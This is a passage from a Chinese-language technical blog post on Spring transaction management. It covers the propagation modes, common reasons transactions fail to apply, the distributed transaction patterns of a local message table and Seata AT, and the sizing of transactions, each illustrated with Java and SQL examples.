<table><thead><tr><th>特性</th><th>NESTED</th><th>REQUIRES_NEW</th></tr></thead><tbody><tr><td>物理事务</td><td>同一个物理事务</td><td>独立的物理事务</td></tr><tr><td>回滚影响</td><td>只回滚到保存点</td><td>完全独立回滚</td></tr><tr><td>锁竞争</td><td>共享主事务锁</td><td>独立锁管理</td></tr><tr><td>性能开销</td><td>较小</td><td>较大</td></tr><tr><td>适用场景</td><td>逻辑嵌套回滚</td><td>完全独立业务</td></tr></tbody></table>
<p><strong>性能对比示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 性能测试对比</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceTestService</span> {
    
    <span class="hljs-comment">// 嵌套事务性能测试</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testNestedPerformance</span><span class="hljs-params">(<span class="hljs-type">int</span> iterations)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iterations; i++) {
            nestedOperation(i);
        }
        
        <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        System.out.println(<span class="hljs-string">"NESTED耗时: "</span> + (endTime - startTime) + <span class="hljs-string">"ms"</span>);
    }
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.NESTED)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nestedOperation</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> {
        <span class="hljs-comment">// 简单数据库操作</span>
        testDao.save(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestEntity</span>(<span class="hljs-string">"nested_"</span> + index));
    }
    
    <span class="hljs-comment">// REQUIRES_NEW性能测试</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testRequiresNewPerformance</span><span class="hljs-params">(<span class="hljs-type">int</span> iterations)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iterations; i++) {
            requiresNewOperation(i);
        }
        
        <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        System.out.println(<span class="hljs-string">"REQUIRES_NEW耗时: "</span> + (endTime - startTime) + <span class="hljs-string">"ms"</span>);
    }
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requiresNewOperation</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> {
        <span class="hljs-comment">// 相同的数据库操作</span>
        testDao.save(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestEntity</span>(<span class="hljs-string">"requires_new_"</span> + index));
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-13">⚠️ 四、事务失效场景深度复盘</h2>
<h3 data-id="heading-14">4.1 事务失效场景分类</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d588e253bdf4cca8272d4eebc1ca609~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=RWLmppxsrLQKCWaEP61Xxh%2Fj%2F%2F8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">4.2 典型失效场景详解</h3>
<h3 data-id="heading-16">4.2.1 方法访问修饰符问题</h3>
<p><strong>问题代码</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-comment">// ❌ private方法，事务失效</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateUserPrivate</span>(<span class="hljs-params">User user</span>) {
        userDao.<span class="hljs-title function_">update</span>(user);
    }
    
    <span class="hljs-comment">// ❌ protected方法，事务失效</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateUserProtected</span>(<span class="hljs-params">User user</span>) {
        userDao.<span class="hljs-title function_">update</span>(user);
    }
    
    <span class="hljs-comment">// ✅ public方法，事务正常</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateUserPublic</span>(<span class="hljs-params">User user</span>) {
        userDao.<span class="hljs-title function_">update</span>(user);
    }
}
</code></pre>
<p><strong>原因分析</strong>： Spring的事务管理基于<strong>AOP代理机制</strong>，默认只能代理public方法。对于private、protected等方法，Spring AOP无法创建代理，因此事务失效。 <strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-comment">// 方法1：将方法改为public</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateUser</span>(<span class="hljs-params">User user</span>) {
        userDao.<span class="hljs-title function_">update</span>(user);
    }
    
    <span class="hljs-comment">// 方法2：通过public方法调用</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">publicWrapperMethod</span>(<span class="hljs-params">User user</span>) {
        <span class="hljs-title function_">updateUserInternal</span>(user);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateUserInternal</span>(<span class="hljs-params">User user</span>) {
        userDao.<span class="hljs-title function_">update</span>(user);
    }
}
</code></pre>
<h3 data-id="heading-17">4.2.2 同类方法调用问题</h3>
<p><strong>问题代码</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-comment">// ❌ 同类方法调用，事务失效</span>
        <span class="hljs-title function_">saveOrder</span>(order);
        <span class="hljs-title function_">updateInventory</span>(order);
    }
    
    <span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveOrder</span>(<span class="hljs-params">Order order</span>) {
        orderDao.<span class="hljs-title function_">save</span>(order);
    }
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateInventory</span>(<span class="hljs-params">Order order</span>) {
        inventoryDao.<span class="hljs-title function_">deductStock</span>(order.<span class="hljs-title function_">getProductId</span>(), order.<span class="hljs-title function_">getQuantity</span>());
    }
}
</code></pre>
<p><strong>原因分析</strong>： Spring AOP使用<strong>动态代理</strong>，当从外部调用方法时，会经过代理对象的事务拦截器。但<strong>同类内部方法调用</strong>时，是直接调用原始对象的方法，绕过了代理对象，因此事务配置失效。 <strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderService</span> self; <span class="hljs-comment">// 注入自身代理对象</span>
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-comment">// ✅ 通过代理对象调用</span>
        self.<span class="hljs-title function_">saveOrder</span>(order);
        self.<span class="hljs-title function_">updateInventory</span>(order);
    }
    
    <span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveOrder</span>(<span class="hljs-params">Order order</span>) {
        orderDao.<span class="hljs-title function_">save</span>(order);
    }
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateInventory</span>(<span class="hljs-params">Order order</span>) {
        inventoryDao.<span class="hljs-title function_">deductStock</span>(order.<span class="hljs-title function_">getProductId</span>(), order.<span class="hljs-title function_">getQuantity</span>());
    }
}
</code></pre>
<p><strong>替代方案</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class OrderService {
    
    <span class="hljs-keyword">@Transactional</span>
    public void createOrder(Order order) {
        <span class="hljs-comment">// ✅ 使用AopContext获取当前代理对象</span>
        ((OrderService) AopContext<span class="hljs-selector-class">.currentProxy</span>())<span class="hljs-selector-class">.saveOrder</span>(order);
        ((OrderService) AopContext<span class="hljs-selector-class">.currentProxy</span>())<span class="hljs-selector-class">.updateInventory</span>(order);
    }
    
    <span class="hljs-keyword">@Transactional</span>(propagation = Propagation.REQUIRES_NEW)
    public void saveOrder(Order order) {
        orderDao<span class="hljs-selector-class">.save</span>(order);
    }
    
    <span class="hljs-keyword">@Transactional</span>
    public void updateInventory(Order order) {
        inventoryDao<span class="hljs-selector-class">.deductStock</span>(order.getProductId(), <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getQuantity</span>());
    }
}
</code></pre>
<h3 data-id="heading-18">4.2.3 异常处理机制问题</h3>
<p><strong>问题代码1：异常被吞掉</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentService</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processPayment</span>(<span class="hljs-params">Payment payment</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 业务处理</span>
            paymentDao.<span class="hljs-title function_">save</span>(payment);
            accountService.<span class="hljs-title function_">deductAccount</span>(payment);
            
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-comment">// ❌ 异常被捕获，事务不会回滚</span>
            log.<span class="hljs-title function_">error</span>(<span class="hljs-string">"支付处理失败"</span>, e);
        }
    }
}
</code></pre>
<p><strong>原因分析</strong>： Spring默认只在<strong>RuntimeException</strong>和<strong>Error</strong>时回滚事务。如果异常被捕获且未重新抛出，事务管理器认为方法执行成功，不会触发回滚。 <strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentService</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processPayment</span>(<span class="hljs-params">Payment payment</span>) {
        <span class="hljs-keyword">try</span> {
            paymentDao.<span class="hljs-title function_">save</span>(payment);
            accountService.<span class="hljs-title function_">deductAccount</span>(payment);
            
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-comment">// ✅ 记录日志后重新抛出异常</span>
            log.<span class="hljs-title function_">error</span>(<span class="hljs-string">"支付处理失败"</span>, e);
            <span class="hljs-keyword">throw</span> e; <span class="hljs-comment">// 重新抛出异常，触发事务回滚</span>
        }
    }
}
</code></pre>
<p><strong>问题代码2：受检异常不回滚</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileService</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processFile</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// ❌ IOException是受检异常，默认不回滚</span>
        fileDao.save(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileRecord</span>(filePath));
        processFileContent(filePath);
    }
}
</code></pre>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileService</span> {
    
    <span class="hljs-comment">// 方案1：指定回滚异常类型</span>
    <span class="hljs-meta">@Transactional(rollbackFor = IOException.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processFile</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        fileDao.save(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileRecord</span>(filePath));
        processFileContent(filePath);
    }
    
    <span class="hljs-comment">// 方案2：指定所有异常都回滚</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processFileV2</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        fileDao.save(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileRecord</span>(filePath));
        processFileContent(filePath);
    }
}
</code></pre>
<h3 data-id="heading-19">4.2.4 事务配置问题</h3>
<p><strong>问题代码：多数据源事务配置错误</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@Primary</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DataSource</span> <span class="hljs-title function_">primaryDataSource</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DataSourceBuilder</span>.<span class="hljs-title function_">create</span>().<span class="hljs-title function_">build</span>();
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DataSource</span> <span class="hljs-title function_">secondaryDataSource</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DataSourceBuilder</span>.<span class="hljs-title function_">create</span>().<span class="hljs-title function_">build</span>();
    }
    
    <span class="hljs-comment">// ❌ 只配置了主数据源的事务管理器</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">PlatformTransactionManager</span> <span class="hljs-title function_">transactionManager</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(<span class="hljs-title function_">primaryDataSource</span>());
    }
}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiDataSourceService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">JdbcTemplate</span> primaryJdbcTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">JdbcTemplate</span> secondaryJdbcTemplate;
    
    <span class="hljs-meta">@Transactional</span> <span class="hljs-comment">// ❌ 只能管理主数据源事务</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">transferData</span>(<span class="hljs-params"/>) {
        primaryJdbcTemplate.<span class="hljs-title function_">update</span>(<span class="hljs-string">"INSERT INTO primary_table ..."</span>);
        secondaryJdbcTemplate.<span class="hljs-title function_">update</span>(<span class="hljs-string">"INSERT INTO secondary_table ..."</span>); <span class="hljs-comment">// 不在事务中</span>
    }
}
</code></pre>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> {
    
    <span class="hljs-meta">@Primary</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DataSource</span> <span class="hljs-title function_">primaryDataSource</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DataSourceBuilder</span>.<span class="hljs-title function_">create</span>().<span class="hljs-title function_">build</span>();
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DataSource</span> <span class="hljs-title function_">secondaryDataSource</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DataSourceBuilder</span>.<span class="hljs-title function_">create</span>().<span class="hljs-title function_">build</span>();
    }
    
    <span class="hljs-meta">@Primary</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">PlatformTransactionManager</span> <span class="hljs-title function_">primaryTransactionManager</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(<span class="hljs-title function_">primaryDataSource</span>());
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">PlatformTransactionManager</span> <span class="hljs-title function_">secondaryTransactionManager</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(<span class="hljs-title function_">secondaryDataSource</span>());
    }
}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiDataSourceService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-meta">@Qualifier</span>(<span class="hljs-string">"primaryJdbcTemplate"</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">JdbcTemplate</span> primaryJdbcTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-meta">@Qualifier</span>(<span class="hljs-string">"secondaryJdbcTemplate"</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">JdbcTemplate</span> secondaryJdbcTemplate;
    
    <span class="hljs-comment">// ✅ 指定具体的事务管理器</span>
    <span class="hljs-meta">@Transactional</span>(<span class="hljs-string">"primaryTransactionManager"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">transferPrimaryData</span>(<span class="hljs-params"/>) {
        primaryJdbcTemplate.<span class="hljs-title function_">update</span>(<span class="hljs-string">"INSERT INTO primary_table ..."</span>);
    }
    
    <span class="hljs-meta">@Transactional</span>(<span class="hljs-string">"secondaryTransactionManager"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">transferSecondaryData</span>(<span class="hljs-params"/>) {
        secondaryJdbcTemplate.<span class="hljs-title function_">update</span>(<span class="hljs-string">"INSERT INTO secondary_table ..."</span>);
    }
    
    <span class="hljs-comment">// 对于跨数据源事务，需要使用JTA分布式事务</span>
    <span class="hljs-comment">// 或者使用编程式事务管理</span>
}
</code></pre>
<h3 data-id="heading-20">4.2.5 数据库引擎问题</h3>
<p><strong>问题代码</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- MySQL使用不支持事务的存储引擎</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
    id <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32</span>),
    amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)
) ENGINE<span class="hljs-operator">=</span>MyISAM; <span class="hljs-comment">-- ❌ MyISAM不支持事务</span>
</code></pre>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 使用支持事务的InnoDB引擎</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
    id <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32</span>),
    amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)
) ENGINE<span class="hljs-operator">=</span>InnoDB; <span class="hljs-comment">-- ✅ InnoDB支持事务</span>
</code></pre>
<p><strong>不同数据库引擎事务支持对比</strong>：</p>








































<table><thead><tr><th>数据库</th><th>引擎</th><th>事务支持</th><th>行级锁</th><th>外键约束</th></tr></thead><tbody><tr><td>MySQL</td><td>InnoDB</td><td>✅ 支持</td><td>✅ 支持</td><td>✅ 支持</td></tr><tr><td>MySQL</td><td>MyISAM</td><td>❌ 不支持</td><td>❌ 不支持</td><td>❌ 不支持</td></tr><tr><td>PostgreSQL</td><td>默认</td><td>✅ 支持</td><td>✅ 支持</td><td>✅ 支持</td></tr><tr><td>Oracle</td><td>默认</td><td>✅ 支持</td><td>✅ 支持</td><td>✅ 支持</td></tr></tbody></table>
<h3 data-id="heading-21">4.3 事务失效检测清单</h3>
<p><strong>开发前检查</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/745d8cfcd26040c5bfe04f62a930f797~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=KDt6NfDi%2B32pXr2Bg6ycGbaimD4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-22">🌐 五、分布式事务处理</h2>
<h3 data-id="heading-23">5.1 分布式事务场景分析</h3>
<p>在微服务架构中，跨服务的事务管理是重大挑战。以下是典型场景：</p>
<h3 data-id="heading-24">5.2 分布式事务解决方案</h3>
<h3 data-id="heading-25">5.2.1 本地消息表（最终一致性）</h3>
<p><strong>实现原理</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class OrderService {
    
    <span class="hljs-keyword">@Autowired</span>
    private OrderDao orderDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageLogDao messageLogDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageProducer messageProducer;
    
    <span class="hljs-keyword">@Transactional</span>
    public void createOrderWithMessage(Order order) {
        <span class="hljs-comment">// 1. 创建订单</span>
        orderDao<span class="hljs-selector-class">.save</span>(order);
        
        <span class="hljs-comment">// 2. 创建消息记录（本地事务）</span>
        MessageLog messageLog = new <span class="hljs-built_in">MessageLog</span>();
        messageLog<span class="hljs-selector-class">.setOrderId</span>(order.getId());
        messageLog<span class="hljs-selector-class">.setContent</span>(JSON.toJSONString(order));
        messageLog<span class="hljs-selector-class">.setStatus</span>(MessageStatus.SENDING);
        messageLogDao<span class="hljs-selector-class">.save</span>(messageLog);
        
        <span class="hljs-comment">// 3. 事务提交后发送消息</span>
        TransactionSynchronizationManager<span class="hljs-selector-class">.registerSynchronization</span>(new TransactionSynchronization() {
            <span class="hljs-keyword">@Override</span>
            public void afterCommit() {
                try {
                    messageProducer<span class="hljs-selector-class">.sendOrderMessage</span>(order);
                    messageLog<span class="hljs-selector-class">.setStatus</span>(MessageStatus.SENT);
                    messageLogDao<span class="hljs-selector-class">.update</span>(messageLog);
                } catch (Exception e) {
                    <span class="hljs-comment">// 发送失败，后续定时任务重试</span>
                    log<span class="hljs-selector-class">.error</span>("消息发送失败", e);
                }
            }
        });
    }
}
</code></pre>
<h3 data-id="heading-26">5.2.2 Seata AT模式（强一致性）</h3>
<p><strong>集成配置</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 订单服务</span>
<span class="hljs-keyword">@Service</span>
public class OrderService {
    
    <span class="hljs-keyword">@Autowired</span>
    private OrderDao orderDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private InventoryServiceFeign inventoryService;
    
    <span class="hljs-comment">// ✅ Seata全局事务注解</span>
    <span class="hljs-keyword">@GlobalTransactional</span>(name = <span class="hljs-string">"create-order"</span>, rollbackFor = Exception.class)
    public void createOrder(Order order) {
        <span class="hljs-comment">// 本地事务操作</span>
        orderDao<span class="hljs-selector-class">.save</span>(order);
        
        <span class="hljs-comment">// 远程调用库存服务</span>
        InventoryDTO inventoryDTO = new <span class="hljs-built_in">InventoryDTO</span>();
        inventoryDTO<span class="hljs-selector-class">.setProductId</span>(order.getProductId());
        inventoryDTO<span class="hljs-selector-class">.setCount</span>(order.getQuantity());
        inventoryService<span class="hljs-selector-class">.deductInventory</span>(inventoryDTO);
        
        <span class="hljs-comment">// 远程调用支付服务</span>
        PaymentDTO paymentDTO = new <span class="hljs-built_in">PaymentDTO</span>();
        paymentDTO<span class="hljs-selector-class">.setOrderId</span>(order.getId());
        paymentDTO<span class="hljs-selector-class">.setAmount</span>(order.getAmount());
        paymentService<span class="hljs-selector-class">.processPayment</span>(paymentDTO);
    }
}
<span class="hljs-comment">// 库存服务</span>
<span class="hljs-keyword">@Service</span>
public class InventoryService {
    
    <span class="hljs-keyword">@Autowired</span>
    private InventoryDao inventoryDao;
    
    <span class="hljs-comment">// ✅ Seata分支事务注解</span>
    <span class="hljs-keyword">@GlobalTransactional</span>
    public void deductInventory(InventoryDTO dto) {
        <span class="hljs-comment">// 检查库存</span>
        Inventory inventory = inventoryDao<span class="hljs-selector-class">.findByProductId</span>(dto.getProductId());
        if (inventory.getCount() &lt; dto<span class="hljs-selector-class">.getCount</span>()) {
            throw new <span class="hljs-built_in">RuntimeException</span>("库存不足");
        }
        
        <span class="hljs-comment">// 扣减库存</span>
        inventory<span class="hljs-selector-class">.setCount</span>(inventory.getCount() - dto<span class="hljs-selector-class">.getCount</span>());
        inventoryDao<span class="hljs-selector-class">.update</span>(inventory);
    }
}
</code></pre>
<p><strong>Seata事务执行流程</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4947dfe0ca8c42dcaded9e3f0ea159bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=6qVqMhSQgjtbnTGvEHL88sjI7zc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-27">⚡ 六、性能优化与最佳实践</h2>
<h3 data-id="heading-28">6.1 事务性能优化策略</h3>
<h3 data-id="heading-29">6.1.1 事务粒度控制</h3>
<p><strong>优化前：长事务</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongTransactionService</span> {
    
    <span class="hljs-comment">// ❌ 事务包含大量耗时操作</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrderWithLongTransaction</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// 数据库操作</span>
        orderDao.save(order);
        
        <span class="hljs-comment">// 耗时的外部调用（不应在事务中）</span>
        <span class="hljs-type">ExternalApiResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> externalApiService.syncOrder(order);
        
        <span class="hljs-comment">// 复杂的业务计算</span>
        <span class="hljs-type">OrderCalculation</span> <span class="hljs-variable">calculation</span> <span class="hljs-operator">=</span> complexCalculationService.calculate(order);
        
        <span class="hljs-comment">// 更多数据库操作</span>
        orderDao.update(calculation);
        
        <span class="hljs-comment">// 文件系统操作（不应在事务中）</span>
        fileService.generateOrderFile(order);
    }
}
</code></pre>
<p><strong>优化后：短事务</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedTransactionService</span> {
    
    <span class="hljs-comment">// ✅ 将事务范围缩小到仅数据库操作</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrderWithShortTransaction</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// 事务1：保存订单</span>
        saveOrder(order);
        
        <span class="hljs-comment">// 非事务：外部调用</span>
        <span class="hljs-type">ExternalApiResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> externalApiService.syncOrder(order);
        
